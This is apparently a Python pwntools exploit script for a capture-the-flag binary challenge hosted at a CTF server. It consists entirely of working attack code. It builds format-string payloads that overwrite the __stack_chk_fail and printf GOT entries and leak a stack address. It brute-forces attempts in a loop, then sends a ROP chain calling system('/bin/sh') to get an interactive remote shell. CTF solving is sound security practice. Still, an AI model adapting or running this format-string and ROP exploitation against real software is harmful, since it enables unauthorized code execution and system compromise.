from pwn import *
import sys

def guess():
    elf = ELF("chall_patched")

    # io = process(elf.path)
    io = remote('greed.sdc.tf', 1337)

    context.arch = 'amd64'
    context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

    # gdb.attach(io, gdbscript='b *0x0000000000400938')

    p = b'%c' * 23
    p += b'%%%dc%%hn' % (0x0708 - 23)
    p += b'%51$n'
    p += b'%%%dc%%18$hn' % ((elf.sym["main"] & 0xffff) - 0x0708)
    p += b'%1$p'

    p += b'\x00' * (0x50 - len(p))
    p += p64(elf.got["__stack_chk_fail"])

    io.sendlineafter(b'want?\n', b'-100000')
    io.sendlineafter(b'audience?\n', p)

    # sleep(1)
    r = io.recvrepeat(10)

    # if r[-4:] == b'dff0':
    if len(r) > 2051:
        
        if b'terminated\n' in r:
            io.close()
            return 1
        print(r)
        stack_addr = int(r[-175:-163].decode(), 16)
        print(f'stack_addr = {hex(stack_addr)}')

        canary_addr = stack_addr + 0x2688
        binsh_addr = stack_addr + 0x2668
        pop5_ret_addr = 0x004009db

        p = b'%13$n'
        p += b'A'
        p += b'%14$hn'
        p += b'%%%dc%%15$hn' % (((elf.sym["main"] + 284) & 0xffff) - 1)
        p += b'%%%dc%%16$n' % ((pop5_ret_addr & 0xffffffff) - ((elf.sym["main"] + 284) & 0xffff))
        p += b'\x00' * (40 - len(p))
        p += p64(elf.got["printf"] + 4)
        p += p64(canary_addr)
        p += p64(elf.got["__stack_chk_fail"])
        p += p64(elf.got["printf"])
        p += b'/bin/sh\x00'

        # gdb.attach(io, gdbscript='b *0x0000000000400938')

        io.sendline(b'-100000')
        io.sendlineafter(b'audience?\n', p)

        p = b'A' * 8
        p += p64(next(elf.search(asm('pop rdi ; ret'), executable=True)))
        p += p64(binsh_addr)
        p += p64(next(elf.search(asm('ret'), executable=True)))
        p += p64(elf.sym["system"])

        sleep(3)
        io.sendline(p)

        io.interactive()
        return 0
    else:
        print(r[-4:])
        io.close()
        # io.interactive()
        return 1
    # stack_addr = int(r[-19:-7].decode(), 16)
    # print(f'stack addr = {hex(stack_addr)}')

cnt = 0
while(guess()):
    cnt += 1
    print(f'take {cnt}')

